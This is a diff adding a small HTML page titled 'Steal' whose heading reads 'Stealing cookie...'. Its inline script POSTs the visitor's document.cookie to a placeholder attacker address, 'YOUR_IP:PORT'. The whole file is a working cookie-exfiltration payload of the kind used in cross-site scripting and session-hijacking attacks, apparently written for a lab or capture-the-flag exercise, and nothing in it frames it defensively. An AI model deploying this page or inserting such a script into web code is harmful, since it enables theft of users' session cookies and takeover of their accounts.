@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head><title>Steal</title></head>
+<body>
+  <h2>Stealing cookie...</h2>
+  <script>
+    fetch("http://YOUR_IP:PORT", {
+      method: "POST",
+      body: document.cookie
+    });
+  </script>
+</body>
+</html>
